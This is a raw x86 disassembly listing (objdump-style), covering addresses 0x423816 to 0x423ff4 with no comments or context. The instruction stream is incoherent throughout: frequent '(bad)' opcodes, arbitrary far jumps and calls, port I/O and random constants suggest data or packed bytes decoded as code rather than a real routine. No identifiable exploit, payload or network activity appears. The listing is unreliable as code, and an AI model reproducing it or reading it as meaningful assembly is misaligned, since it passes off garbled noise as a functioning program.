  423816:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423817:	inc    ecx
  423818:	dec    esp
  423819:	aad    0xf8
  42381b:	pop    eax
  42381c:	xchg   edx,eax
  42381d:	pop    esi
  42381e:	push   DWORD PTR cs:[esi-0x65067c2c]
  423825:	mov    bh,0xda
  423827:	inc    ebx
  423828:	dec    edi
  423829:	xor    al,0xcc
  42382b:	and    BYTE PTR [esi],dh
  42382d:	mov    bl,BYTE PTR [edi+esi*1-0x4f]
  423831:	(bad)  
  423832:	fistp  DWORD PTR [eax]
  423834:	loopne 0x4238ad
  423836:	push   ss
  423837:	pushf  
  423838:	inc    edi
  423839:	out    0xd2,eax
  42383b:	clc    
  42383c:	push   ecx
  42383d:	rcl    DWORD PTR [edi+ecx*2],cl
  423840:	scas   al,BYTE PTR es:[edi]
  423841:	repnz sub al,BYTE PTR [ebx-0x292741bb]
  423848:	test   DWORD PTR [ecx+0x35],edi
  42384b:	mov    al,ds:0xa4b204b
  423850:	adc    BYTE PTR [edx+0x29],0xaf
  423854:	call   0x637e352b
  423859:	int    0xbc
  42385b:	shl    BYTE PTR [edi],0x6e
  42385e:	imul   esi,DWORD PTR [edi-0x13af5da5],0x58
  423865:	cmp    BYTE PTR [ecx+esi*1],0x8d
  423869:	cli    
  42386a:	sbb    al,0xdc
  42386c:	mov    dl,0xd5
  42386e:	jae    0x4238cf
  423870:	xchg   ecx,eax
  423871:	or     BYTE PTR ds:0x48d65db1,ah
  423877:	push   0x2e
  423879:	sahf   
  42387a:	sbb    al,BYTE PTR [ebp+0x1f]
  42387d:	test   eax,0xc1f8ebf1
  423882:	pminub mm7,mm2
  423885:	mov    ebp,DWORD PTR [edi*1-0xe46c630]
  42388c:	hlt    
  42388d:	xchg   esp,eax
  42388e:	fild   DWORD PTR [ebp+0x5845051f]
  423894:	pop    edx
  423895:	add    eax,0x75150a5b
  42389a:	loope  0x423827
  42389c:	dec    ecx
  42389d:	popf   
  42389e:	add    eax,0xb791a199
  4238a3:	sbb    dh,BYTE PTR ds:0x927089fb
  4238a9:	aas    
  4238aa:	sbb    esp,DWORD PTR [edx]
  4238ac:	push   cs
  4238ad:	mov    ebx,0x8d63e696
  4238b2:	mov    dl,0x58
  4238b4:	test   eax,0x961326e
  4238b9:	jmp    0x451b:0xe29b3fad
  4238c0:	mov    dl,0x71
  4238c2:	les    ecx,FWORD PTR ds:0xf28ff2d4
  4238c8:	dec    ecx
  4238c9:	ja     0x4238a8
  4238cb:	fdivr  QWORD PTR [edi+eax*8]
  4238ce:	xlat   BYTE PTR ds:[ebx]
  4238cf:	and    bl,ah
  4238d1:	lock and dh,BYTE PTR [esi+0x62]
  4238d5:	xchg   dh,ch
  4238d7:	cmp    al,0x22
  4238d9:	pop    edi
  4238da:	adc    BYTE PTR [edx+0x712ea179],dh
  4238e0:	jo     0x4238c8
  4238e2:	xor    bh,BYTE PTR [ebp+0x5b]
  4238e5:	imul   esi,DWORD PTR [eax+0x1100be5f],0x9eb5bfa9
  4238ef:	pop    edx
  4238f0:	mov    esp,0x61b0ace0
  4238f5:	push   cs
  4238f6:	mov    eax,ds:0xc5b70fe0
  4238fb:	repz jb 0x4238b2
  4238fe:	int    0x4
  423900:	xchg   ebx,eax
  423901:	in     al,0x62
  423903:	in     al,0xf3
  423905:	stos   DWORD PTR es:[edi],eax
  423906:	cwde   
  423907:	xchg   edx,eax
  423908:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  42390a:	xor    DWORD PTR [esi+0x26],esi
  42390d:	pop    ds
  42390e:	dec    ecx
  42390f:	push   0x42
  423911:	ja     0x4238ff
  423913:	jbe    0x423911
  423915:	sub    bl,BYTE PTR [esi]
  423917:	aad    0xe5
  423919:	loop   0x423999
  42391b:	jbe    0x423919
  42391d:	mov    WORD PTR [eax-0x26],?
  423920:	cmc    
  423921:	nop
  423922:	loopne 0x42397c
  423924:	std    
  423925:	mov    ebx,0x683c6adc
  42392a:	ins    DWORD PTR es:[edi],dx
  42392b:	jnp    0x423909
  42392d:	push   0xd2ff4862
  423932:	nop
  423933:	clc    
  423934:	jl     0x42399e
  423936:	sar    eax,0x74
  423939:	cli    
  42393a:	add    DWORD PTR [edx-0x3f],edx
  42393d:	xor    bh,bl
  42393f:	test   DWORD PTR [edi-0x64],edi
  423942:	mov    esp,0x3b45abd6
  423947:	sbb    al,0x8c
  423949:	push   ecx
  42394a:	inc    esi
  42394b:	mov    eax,ds:0x68fe7ab2
  423950:	(bad)  
  423951:	pop    esi
  423952:	mov    bh,0x6a
  423954:	rol    BYTE PTR [ecx],1
  423956:	and    edi,ebp
  423958:	repz leave 
  42395a:	cmp    dl,BYTE PTR [eax+edx*2+0x57]
  42395e:	fcomp  DWORD PTR [ecx+0x67]
  423961:	xor    eax,0xd9b468ea
  423966:	inc    eax
  423967:	loopne 0x423932
  423969:	cli    
  42396a:	(bad)  
  42396b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42396c:	and    DWORD PTR [edi+0x68],esp
  42396f:	xchg   esi,edx
  423971:	jmp    0x4238f3
  423973:	stos   DWORD PTR es:[edi],eax
  423974:	cli    
  423975:	les    ebp,FWORD PTR [ebx+0x502beb64]
  42397b:	mov    edx,0xf176945f
  423980:	das    
  423981:	dec    ebp
  423982:	mov    edi,DWORD PTR [eax+0x21]
  423985:	jmp    0x2d0d:0x2ad7bc54
  42398c:	inc    ebx
  42398d:	dec    eax
  42398e:	rol    BYTE PTR [eax+0x6e4c812a],0x84
  423995:	mov    ebp,0x58d737d1
  42399a:	cmp    DWORD PTR [edi-0x718e876],0xaba78f45
  4239a4:	jno    0x42398c
  4239a6:	mov    dh,0xcd
  4239a8:	jne    0x423944
  4239aa:	cli    
  4239ab:	inc    edi
  4239ac:	dec    esi
  4239ad:	dec    ebx
  4239ae:	jmp    0x8642d0f9
  4239b3:	fidivr DWORD PTR [ebp+ebp*8+0x66f2a2eb]
  4239ba:	mov    esi,0x3fc4fb63
  4239bf:	test   DWORD PTR [ecx+0x2f],edi
  4239c2:	pusha  
  4239c3:	psrad  mm5,QWORD PTR [ecx]
  4239c6:	push   ss
  4239c7:	mov    ah,0xfe
  4239ca:	adc    ecx,DWORD PTR [edi]
  4239cc:	mov    ch,0x75
  4239ce:	fiadd  DWORD PTR [esi-0x70]
  4239d1:	popf   
  4239d2:	sub    BYTE PTR [ebp+0x1f],bl
  4239d5:	pop    ebx
  4239d6:	hlt    
  4239d7:	retf   
  4239d8:	push   cs
  4239d9:	ss dec esi
  4239db:	shr    DWORD PTR [ecx-0x57],cl
  4239de:	mov    esp,DWORD PTR es:[edx+0x9f81b2d]
  4239e5:	or     edi,DWORD PTR [ebp+0x536f1201]
  4239eb:	test   al,0x70
  4239ed:	pop    edx
  4239ee:	or     esp,ebp
  4239f0:	mov    ch,0x33
  4239f2:	sub    BYTE PTR ds:0xcaa22d02,dl
  4239f8:	xor    DWORD PTR [edi+edi*8+0x7a5a2cb3],ebx
  4239ff:	fistp  WORD PTR [ebp+edi*1-0x6c7b3fea]
  423a06:	mov    esp,ebx
  423a08:	mov    cl,0x43
  423a0a:	push   0x7d45b2ba
  423a0f:	jmp    0xb627:0x901efce8
  423a16:	lea    esi,[edx+ebp*2+0x4c]
  423a1a:	add    BYTE PTR [ecx],dl
  423a1c:	push   ecx
  423a1d:	leave  
  423a1e:	and    DWORD PTR [eax],0x76dabe29
  423a24:	nop
  423a25:	fdivrp st(0),st
  423a27:	fs dec ecx
  423a29:	jge    0x423a80
  423a2b:	mov    ebp,0xbaa0ccc2
  423a30:	cmp    eax,0x35498869
  423a35:	daa    
  423a36:	sub    dl,BYTE PTR [edx]
  423a38:	ror    BYTE PTR [ebp+0x27],cl
  423a3b:	mov    edx,DWORD PTR fs:0x2b6c3f21
  423a42:	hlt    
  423a43:	push   edi
  423a44:	out    0xb7,eax
  423a46:	mov    edi,0x749fa5d6
  423a4b:	mul    dl
  423a4d:	sub    bh,dh
  423a4f:	jmp    0x622a:0xbdf40db4
  423a56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423a57:	imul   eax,DWORD PTR [edx+0x68549bd5],0xffffffc2
  423a5e:	scas   al,BYTE PTR es:[edi]
  423a5f:	neg    BYTE PTR [esi]
  423a61:	fstp   DWORD PTR [edi-0x53772d48]
  423a67:	sbb    dh,BYTE PTR [eax]
  423a69:	xor    DWORD PTR [esi+0x50],edx
  423a6c:	aad    0x1b
  423a6e:	mov    esi,0x29127465
  423a73:	cmp    ch,ah
  423a75:	xchg   ebx,eax
  423a76:	push   ss
  423a77:	shl    BYTE PTR [esi-0x657318ff],1
  423a7d:	jge    0x423ab7
  423a7f:	retf   
  423a80:	or     cl,BYTE PTR [ebx]
  423a82:	dec    edi
  423a83:	jae    0x423ae5
  423a85:	(bad)  
  423a86:	in     al,dx
  423a87:	cmp    bl,cl
  423a89:	and    ecx,ebp
  423a8b:	mov    al,ds:0xc68891fb
  423a90:	(bad)
  423a94:	push   0x0
	...
  423aaa:	pop    eax
  423aab:	pop    ecx
  423aac:	dec    ebx
  423aad:	push   ebp
  423aae:	dec    ebx
  423aaf:	push   edi
  423ab0:	pop    esi
  423ab1:	pop    ebp
  423ab2:	mov    ebx,0xf7a42923
  423ab7:	dec    edi
  423ab8:	and    eax,0x1c861d2
  423abd:	add    bl,dl
  423abf:	push   es
  423ac0:	add    BYTE PTR [eax],al
  423ac2:	sbb    BYTE PTR [ecx],0x58
  423ac5:	dec    edi
  423ac6:	ds iret 
  423ac8:	retf   0x32c
  423acb:	push   0x77
  423acd:	aaa    
  423ace:	addr16 mov al,ds:0xabae
  423ad2:	mov    ebx,0x3b8b3d89
  423ad7:	rcr    dh,0xf2
  423ada:	icebp  
  423adb:	ffreep st(1)
  423add:	xor    BYTE PTR [edx+0x3],dl
  423ae0:	or     BYTE PTR [ebx],0xfc
  423ae3:	xchg   DWORD PTR [ebx],ebp
  423ae5:	loope  0x423ab2
  423ae7:	ja     0x423b3f
  423ae9:	dec    edx
  423aea:	inc    esp
  423aeb:	aaa    
  423aec:	mov    esi,0x2eb5bbe4
  423af1:	jne    0x423b04
  423af3:	bound  eax,QWORD PTR [ecx+0x3d]
  423af6:	repnz sub ecx,edi
  423af9:	adc    BYTE PTR [ebx],bl
  423afb:	retf   
  423afc:	xchg   DWORD PTR [edi],edi
  423afe:	fxch   st(5)
  423b00:	mov    ebp,0xf17e42c4
  423b05:	je     0x423a8b
  423b07:	ffree  st(6)
  423b09:	dec    eax
  423b0a:	xor    BYTE PTR es:[eax],dh
  423b0d:	sub    ah,BYTE PTR [edi-0x4e]
  423b10:	lods   al,BYTE PTR ds:[esi]
  423b11:	push   esi
  423b12:	aam    0xb0
  423b14:	std    
  423b15:	data16 fcomp st(0)
  423b18:	cdq    
  423b19:	addr16 jb 0x423b58
  423b1c:	rcl    BYTE PTR [ecx-0x386f550a],cl
  423b22:	sar    BYTE PTR [edi],cl
  423b24:	pop    edi
  423b25:	xlat   BYTE PTR ds:[ebx]
  423b26:	pop    esi
  423b27:	retf   0xa764
  423b2a:	cmp    cl,BYTE PTR [eax-0x3498d147]
  423b30:	ret    0xe443
  423b33:	pop    ebx
  423b34:	jo     0x423bb4
  423b36:	retf   
  423b37:	fs je  0x423b1e
  423b3a:	aam    0xaf
  423b3c:	or     al,0x64
  423b3e:	mov    edi,DWORD PTR [ecx-0x51]
  423b41:	(bad)  
  423b42:	scas   eax,DWORD PTR es:[edi]
  423b43:	cli    
  423b44:	nop
  423b45:	and    al,0xaa
  423b47:	xchg   edi,eax
  423b48:	into   
  423b49:	and    DWORD PTR [ebp+0x3afe5afe],0x52
  423b50:	mov    edx,DWORD PTR [ecx-0x174a4e44]
  423b56:	pop    ss
  423b57:	push   eax
  423b58:	fwait
  423b59:	adc    edx,DWORD PTR ds:0xc01fc4c0
  423b5f:	adc    al,BYTE PTR [ecx]
  423b61:	and    eax,0xc772e2d1
  423b66:	jle    0x423bb0
  423b68:	fwait
  423b69:	inc    ecx
  423b6a:	retf   0xb98b
  423b6d:	and    esp,0x78
  423b70:	inc    ebp
  423b71:	adc    eax,0x46949bc1
  423b76:	ror    dl,1
  423b78:	out    dx,al
  423b79:	mul    BYTE PTR [ebx]
  423b7b:	mov    edi,0xf08b4926
  423b80:	and    al,0xc6
  423b82:	xor    eax,0xe99f8ccf
  423b87:	sbb    eax,esp
  423b89:	clc    
  423b8a:	or     eax,0x72bf36be
  423b8f:	xor    BYTE PTR [ebx-0x58],bh
  423b92:	push   cs
  423b93:	cs xchg edx,eax
  423b95:	stc    
  423b96:	arpl   WORD PTR es:[esi-0x11f545c6],bx
  423b9d:	xor    eax,0xa84f3105
  423ba2:	cmp    DWORD PTR [ecx-0x5189ff4c],edi
  423ba8:	loope  0x423bff
  423baa:	ins    BYTE PTR es:[edi],dx
  423bab:	and    BYTE PTR [edi+0x39],al
  423bae:	js     0x423ba3
  423bb0:	rcr    DWORD PTR [edi+0x1f],1
  423bb3:	pop    esi
  423bb4:	dec    ebx
  423bb5:	mov    edx,0x1bce1017
  423bba:	cs mov esi,0x8e0e472f
  423bc0:	frstor ds:0x47651279
  423bc6:	aaa    
  423bc7:	addr16 cmp eax,0x4589040d
  423bcd:	(bad)  
  423bce:	xlat   BYTE PTR ds:[ebx]
  423bcf:	popa   
  423bd0:	sbb    ecx,DWORD PTR [esi]
  423bd2:	inc    ebx
  423bd3:	lods   eax,DWORD PTR ds:[esi]
  423bd4:	cmc    
  423bd5:	test   al,0x2e
  423bd7:	mov    WORD PTR [esi-0x4b],cs
  423bda:	sti    
  423bdb:	inc    eax
  423bdc:	jp     0x423c50
  423bde:	lds    ebp,FWORD PTR [ebx]
  423be0:	add    BYTE PTR [edi-0x6d],0xa8
  423be4:	ret    0x24a1
  423be7:	repz xor eax,ecx
  423bea:	cld    
  423beb:	adc    BYTE PTR [ebx-0x90dda04],bh
  423bf1:	adc    edx,ebp
  423bf3:	xor    DWORD PTR [eax-0xee017e8],edx
  423bf9:	mov    eax,0xa5f4f6f4
  423bfe:	inc    ebx
  423bff:	or     DWORD PTR [edi+0x4d18f60b],edx
  423c05:	or     eax,0x8a779e4
  423c0a:	adc    al,0xb9
  423c0c:	dec    eax
  423c0d:	mov    eax,ds:0xb73e5803
  423c12:	push   0x19
  423c14:	adc    BYTE PTR [edi-0x21],al
  423c17:	mov    dh,BYTE PTR [ebx]
  423c19:	dec    eax
  423c1a:	arpl   WORD PTR [eax+edi*8-0x4613cedc],sp
  423c21:	xchg   ebp,eax
  423c22:	outs   dx,DWORD PTR ds:[esi]
  423c23:	dec    edx
  423c24:	dec    ebx
  423c25:	fidivr WORD PTR [ecx]
  423c27:	mov    edi,0x32b2302b
  423c2c:	loop   0x423c23
  423c2e:	dec    esp
  423c2f:	jecxz  0x423c61
  423c31:	add    BYTE PTR [ecx-0x49],ch
  423c34:	fild   WORD PTR [edi+eax*2]
  423c37:	dec    esp
  423c38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423c39:	push   ss
  423c3a:	fisttp DWORD PTR [ecx+0x2]
  423c3d:	xchg   ecx,eax
  423c3e:	sub    BYTE PTR [edi-0x19],0xe7
  423c42:	push   esi
  423c43:	push   ss
  423c44:	or     al,0x12
  423c46:	xor    dl,BYTE PTR [eax-0x61ff2df4]
  423c4c:	sti    
  423c4d:	adc    al,0x1
  423c4f:	pop    ecx
  423c50:	fmul   QWORD PTR [ebp+0x8e33d68]
  423c56:	mov    eax,0x307659a7
  423c5b:	aad    0x59
  423c5d:	sub    BYTE PTR [edi+0x70a5ea24],dh
  423c63:	pop    ss
  423c64:	sahf   
  423c65:	cmp    dh,BYTE PTR [eax+0x16d8a3c3]
  423c6b:	dec    edx
  423c6c:	or     dh,BYTE PTR [eax-0x38e747ee]
  423c72:	xor    ecx,esi
  423c74:	aas    
  423c75:	mov    ds:0x1f0c2b23,eax
  423c7a:	xchg   bh,dl
  423c7c:	xor    eax,0x5d57d772
  423c81:	cmp    ebx,ebp
  423c83:	mov    bl,0x49
  423c85:	loope  0x423c69
  423c87:	out    0x77,al
  423c89:	sub    eax,0x32d40297
  423c8e:	fstp   QWORD PTR [ebx-0x2]
  423c91:	or     al,0x87
  423c93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423c94:	adc    al,0x79
  423c96:	cdq    
  423c97:	cld    
  423c98:	aaa    
  423c99:	ret    
  423c9a:	aam    0x70
  423c9c:	(bad)  
  423c9d:	daa    
  423c9e:	inc    esp
  423c9f:	fistp  QWORD PTR [edi+0xdaf066f]
  423ca5:	jge    0x423c6b
  423ca7:	shl    eax,0xf5
  423caa:	not    BYTE PTR [ecx-0x8]
  423cad:	push   0x21
  423caf:	xchg   esi,esp
  423cb1:	in     al,0x86
  423cb3:	(bad)  
  423cb4:	bound  edi,QWORD PTR [ebp-0x4c]
  423cb7:	loop   0x423cb9
  423cb9:	hlt    
  423cba:	xlat   BYTE PTR ds:[ebx]
  423cbb:	sub    BYTE PTR [edx+0x7affd528],bh
  423cc1:	cmc    
  423cc2:	add    al,0x85
  423cc4:	rol    DWORD PTR [esi-0x139bd62],1
  423cca:	mov    bh,0xc9
  423ccc:	push   ss
  423ccd:	xor    BYTE PTR [esi+eax*8-0x7e084cce],dh
  423cd4:	jbe    0x423d38
  423cd6:	pop    eax
  423cd7:	neg    BYTE PTR [eax]
  423cd9:	test   al,0xc9
  423cdb:	jge    0x423c69
  423cdd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423cde:	jo     0x423c6f
  423ce0:	inc    esi
  423ce1:	xor    eax,0x7e0dabe3
  423ce6:	jecxz  0x423c88
  423ce8:	outs   dx,BYTE PTR ds:[esi]
  423ce9:	leave  
  423cea:	test   ecx,eax
  423cec:	mov    dh,0x71
  423cee:	dec    edx
  423cef:	inc    esp
  423cf0:	(bad)  
  423cf1:	mov    DWORD PTR [eax],eax
  423cf3:	mov    ds:0xa766b914,al
  423cf8:	stos   BYTE PTR es:[edi],al
  423cf9:	push   ds
  423cfa:	pushf  
  423cfb:	fwait
  423cfc:	push   cs
  423cfd:	test   DWORD PTR [edx],ebp
  423cff:	into   
  423d00:	mov    ch,0xdb
  423d02:	ja     0x423ca0
  423d04:	fcmovnb st,st(3)
  423d06:	retf   0xa8db
  423d09:	ds mov dl,0x30
  423d0c:	stos   BYTE PTR es:[edi],al
  423d0d:	int3   
  423d0e:	lea    ebp,[ebx]
  423d10:	xchg   edx,eax
  423d11:	fadd   QWORD PTR [eax]
  423d13:	or     eax,0xfe4494a5
  423d18:	sub    ebp,DWORD PTR [edx]
  423d1a:	xchg   edx,eax
  423d1b:	cdq    
  423d1c:	scas   eax,DWORD PTR es:[edi]
  423d1d:	pop    ds
  423d1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423d1f:	xchg   ebp,eax
  423d20:	ins    BYTE PTR es:[edi],dx
  423d21:	cmp    bl,bh
  423d23:	call   0x1c34:0xecf87878
  423d2a:	add    DWORD PTR [eax-0x86bd8cf],ecx
  423d30:	sti    
  423d31:	sub    DWORD PTR [ecx-0x5991a26b],esi
  423d37:	dec    ecx
  423d38:	cld    
  423d39:	sbb    al,0xf1
  423d3b:	sahf   
  423d3c:	jo     0x423cc3
  423d3e:	add    esp,eax
  423d40:	inc    esp
  423d41:	shl    DWORD PTR [esi-0x10],cl
  423d44:	out    dx,eax
  423d45:	cld    
  423d46:	pop    edi
  423d47:	or     eax,0x10d9dc4d
  423d4c:	push   ds
  423d4d:	ins    BYTE PTR es:[edi],dx
  423d4e:	xchg   ecx,eax
  423d4f:	xchg   BYTE PTR [eax],dh
  423d51:	pop    es
  423d52:	dec    edx
  423d53:	jmp    0x423d5a
  423d55:	scas   eax,DWORD PTR es:[edi]
  423d56:	in     al,dx
  423d57:	mov    bl,0x20
  423d59:	adc    edi,DWORD PTR [ebp+0x73]
  423d5c:	std    
  423d5d:	std    
  423d5e:	imul   edx,DWORD PTR [edi],0x52
  423d61:	mov    cl,0xb7
  423d63:	cld    
  423d64:	pop    es
  423d65:	or     eax,0x5b319edb
  423d6a:	dec    ecx
  423d6b:	(bad)  
  423d6c:	xchg   esp,eax
  423d6d:	xchg   ecx,eax
  423d6e:	dec    ecx
  423d6f:	xchg   ecx,eax
  423d70:	in     eax,dx
  423d71:	out    0x46,eax
  423d73:	mov    ecx,0xf36ffca0
  423d78:	or     eax,0x8ec8f246
  423d7d:	sub    eax,0xb5c24797
  423d82:	or     eax,0x8c2a997
  423d87:	xchg   ebx,eax
  423d88:	ret    0x1e4
  423d8b:	mov    dl,0x61
  423d8d:	xchg   BYTE PTR [esp+ecx*1],dl
  423d90:	jg     0x423d58
  423d92:	ror    DWORD PTR [edx-0x9],0xd0
  423d96:	adc    DWORD PTR [ecx+0x4c],0xffffff9a
  423d9a:	loopne 0x423d4c
  423d9c:	test   al,0x28
  423d9e:	or     al,0xac
  423da0:	aam    0x1
  423da2:	pusha  
  423da3:	push   esp
  423da4:	outs   dx,BYTE PTR ds:[esi]
  423da5:	ret    0x4fcb
  423da8:	cli    
  423da9:	adc    eax,0x38a5211d
  423dae:	(bad)  
  423daf:	cmp    eax,0xcc024615
  423db4:	test   eax,0x3935578f
  423db9:	mov    ds:0xe8efd595,al
  423dbe:	cmp    edi,0x47
  423dc1:	jle    0x423e0f
  423dc3:	jecxz  0x423e21
  423dc5:	mov    eax,0xe6ff9f99
  423dca:	or     eax,DWORD PTR [edi]
  423dcc:	xchg   ebp,eax
  423dcd:	and    edx,DWORD PTR [ebx-0x26]
  423dd0:	call   0xc5545024
  423dd5:	lds    esi,FWORD PTR [ebp-0x5d2b3f6c]
  423ddb:	scas   eax,DWORD PTR es:[edi]
  423ddc:	rcr    bl,cl
  423dde:	sbb    eax,0x3f4c8d81
  423de3:	das    
  423de4:	mov    al,ds:0xc58d08cb
  423de9:	daa    
  423dea:	ret    
  423deb:	ret    
  423dec:	adc    BYTE PTR [ecx],0xbe
  423def:	mov    eax,ds:0x95f10392
  423df4:	inc    DWORD PTR [ebx]
  423df6:	les    ebp,FWORD PTR [ecx+0x3744304a]
  423dfc:	outs   dx,DWORD PTR ds:[esi]
  423dfd:	mov    ah,0x36
  423dff:	or     dl,BYTE PTR ds:0x77635cd4
  423e05:	in     eax,0x6e
  423e07:	jae    0x423dfd
  423e09:	test   BYTE PTR [edi-0x71236f3e],bl
  423e0f:	retf   0x27a0
  423e12:	lds    edx,FWORD PTR [esi+ebx*2]
  423e15:	cli    
  423e16:	bound  esp,QWORD PTR [eax+ebp*1-0xa24b863]
  423e1d:	or     ebx,DWORD PTR [ecx-0x38f16e16]
  423e23:	xchg   eax,ebp
  423e25:	ror    BYTE PTR es:[eax+0x70b18d48],cl
  423e2c:	fnstenv [ecx+0x443211f]
  423e32:	fs out 0x18,eax
  423e35:	in     al,0x50
  423e37:	(bad)  
  423e38:	pop    esi
  423e39:	and    al,0x3b
  423e3b:	mov    cl,0xfa
  423e3d:	fdiv   DWORD PTR [edi+0x49]
  423e40:	ins    DWORD PTR es:[edi],dx
  423e41:	sahf   
  423e42:	jbe    0x423dea
  423e44:	xor    ecx,DWORD PTR [ebx-0x53328265]
  423e4a:	dec    ebp
  423e4b:	jnp    0x423e79
  423e4d:	and    ecx,edi
  423e4f:	jmp    DWORD PTR [eax-0x2723a4e2]
  423e55:	cmp    DWORD PTR [eax],0xd8a87f9a
  423e5b:	jmp    0xc5ef:0xe006c3ae
  423e62:	mov    ch,0xf7
  423e64:	enter  0x1a4d,0xe3
  423e68:	mov    edi,DWORD PTR ds:0x518bb937
  423e6e:	mov    dx,0x48c7
  423e72:	pop    ecx
  423e73:	sbb    dh,bl
  423e75:	std    
  423e76:	sub    al,0x5c
  423e78:	inc    ebp
  423e79:	dec    ecx
  423e7a:	lea    eax,[edx+0x4c]
  423e7d:	add    BYTE PTR [eax-0x9241e06],bh
  423e83:	sub    bl,BYTE PTR [ebx-0x21]
  423e86:	es hlt 
  423e88:	mov    esi,0x7015a021
  423e8d:	mov    ds:0x84ba42ff,eax
  423e92:	inc    esp
  423e93:	fucomip st,st(6)
  423e95:	xchg   edx,eax
  423e96:	xchg   esi,eax
  423e97:	mov    ds:0xd8e68bd5,eax
  423e9c:	pop    ecx
  423e9d:	je     0x423eb2
  423e9f:	js     0x423e34
  423ea1:	push   ss
  423ea2:	and    BYTE PTR [edi+0xb],bh
  423ea5:	std    
  423ea6:	inc    esi
  423ea7:	call   0x94e062fa
  423eac:	out    0x2d,al
  423eae:	inc    ebp
  423eaf:	fisubr WORD PTR [edi+eiz*1-0x72]
  423eb3:	enter  0xf376,0x79
  423eb7:	dec    ebx
  423eb8:	push   cs
  423eb9:	cld    
  423eba:	dec    edi
  423ebb:	pop    ebx
  423ebc:	bound  ebp,QWORD PTR [edx-0x1513f0b6]
  423ec2:	and    al,0x6b
  423ec4:	push   ds
  423ec5:	(bad)  
  423ec6:	lock xchg edi,eax
  423ec8:	adc    ch,BYTE PTR [ecx-0x209f8f40]
  423ece:	scas   al,BYTE PTR es:[edi]
  423ecf:	sbb    bl,ch
  423ed1:	push   ss
  423ed2:	mov    edx,0x9dcffd82
  423ed7:	sti    
  423ed8:	mov    dl,0xb7
  423eda:	inc    ebx
  423edb:	cvttps2pi mm7,QWORD PTR [eax-0x6a6dcc45]
  423ee2:	pop    ss
  423ee3:	or     ebx,DWORD PTR [ecx+0x7157c5cc]
  423ee9:	cmp    eax,DWORD PTR [ebx+esi*4]
  423eec:	rcl    BYTE PTR [ebp-0x2a],1
  423eef:	ins    BYTE PTR es:[edi],dx
  423ef0:	lods   al,BYTE PTR ds:[esi]
  423ef1:	int    0x14
  423ef3:	ds pop es
  423ef5:	inc    ecx
  423ef6:	jbe    0x423ef1
  423ef8:	lods   eax,DWORD PTR ds:[esi]
  423ef9:	push   esp
  423efa:	jns    0x423f76
  423efc:	out    0xff,al
  423efe:	out    0x3d,al
  423f00:	fsub   QWORD PTR [edx]
  423f02:	cs cdq 
  423f04:	inc    ecx
  423f05:	push   0xf2b29f22
  423f0a:	ret    
  423f0b:	xor    al,0x27
  423f0d:	mov    ah,0x7d
  423f0f:	push   0xb03989c0
  423f14:	dec    eax
  423f15:	jmp    0x80e2d379
  423f1a:	inc    ecx
  423f1b:	add    al,0x33
  423f1d:	sbb    al,BYTE PTR [edx]
  423f1f:	pop    es
  423f20:	add    edi,DWORD PTR [ebp-0x773dbe96]
  423f26:	jbe    0x423ea8
  423f28:	in     al,0xa8
  423f2a:	test   al,0xa3
  423f2c:	xchg   ebp,eax
  423f2d:	dec    ecx
  423f2e:	(bad)
  423f31:	mov    al,0x3b
  423f33:	mov    ch,0xea
  423f35:	adc    DWORD PTR [ebx+0x79813c41],edi
  423f3b:	ret    
  423f3c:	push   esi
  423f3d:	and    DWORD PTR [esp+edx*8+0x553df489],esp
  423f44:	into   
  423f45:	out    dx,al
  423f46:	fld    QWORD PTR [ebx+0x2]
  423f49:	sbb    BYTE PTR [ecx+eiz*4],dl
  423f4c:	rcr    ebp,1
  423f4e:	cmp    DWORD PTR [ecx-0x5f],0x5a
  423f52:	push   0xceb18c94
  423f57:	(bad)  
  423f58:	push   0x13
  423f5a:	in     al,dx
  423f5b:	into   
  423f5c:	mov    ah,0xd8
  423f5e:	(bad)
  423f61:	adc    bl,0xc5
  423f64:	mov    ebp,0xb296f19c
  423f69:	mov    ah,0xd0
  423f6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423f6c:	jge    0x423f4a
  423f6e:	adc    al,0x24
  423f70:	call   0x2dd0:0x5154f2e4
  423f77:	inc    ebx
  423f78:	call   0x5584:0x7b9a5187
  423f7f:	inc    ecx
  423f80:	daa    
  423f81:	in     eax,dx
  423f82:	jno    0x423fc8
  423f84:	jb     0x423f2d
  423f86:	les    ebx,FWORD PTR [edx]
  423f88:	je     0x424000
  423f8a:	pop    ss
  423f8b:	popa   
  423f8c:	push   0x340befa3
  423f91:	pop    edi
  423f92:	cld    
  423f93:	retf   
  423f94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423f95:	stos   DWORD PTR es:[edi],eax
  423f96:	push   ebp
  423f97:	jp     0x423f86
  423f99:	dec    esi
  423f9a:	xchg   ebx,eax
  423f9b:	cmp    eax,eax
  423f9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423f9e:	inc    esi
  423f9f:	call   0x3b3a81f1
  423fa4:	lahf   
  423fa5:	(bad)  
  423fa6:	ror    BYTE PTR [ecx-0x1d9d1027],cl
  423fac:	fcomp  st(7)
  423fae:	jnp    0x423ff6
  423fb0:	xchg   DWORD PTR [ebp-0x207aa49b],esp
  423fb6:	ror    eax,cl
  423fb8:	repz pop ds
  423fba:	push   edi
  423fbb:	xchg   BYTE PTR [ebp+0x6a8d951a],ah
  423fc1:	mov    ?,WORD PTR [eax-0xf34d74a]
  423fc7:	jle    0x423fec
  423fc9:	dec    ebx
  423fca:	xchg   BYTE PTR [ecx],bl
  423fcc:	ret    
  423fcd:	bswap  esi
  423fcf:	mov    dh,0xb9
  423fd1:	into   
  423fd2:	pop    ebx
  423fd3:	scas   eax,DWORD PTR es:[edi]
  423fd4:	(bad)  
  423fd5:	out    0x92,eax
  423fd7:	leave  
  423fd8:	pop    ebx
  423fd9:	adc    edx,DWORD PTR ss:0xd14cb7e1
  423fe0:	sahf   
  423fe1:	imul   edx,edi,0x93c966dc
  423fe7:	repnz fdivr st(0),st
  423fea:	(bad)  
  423feb:	adc    esp,DWORD PTR [edx+0x62]
  423fee:	gs sahf 
  423ff0:	push   ebx
  423ff1:	sub    DWORD PTR [ecx+0x42],esp
  423ff4:	stos   DWORD PTR es:[edi],eax
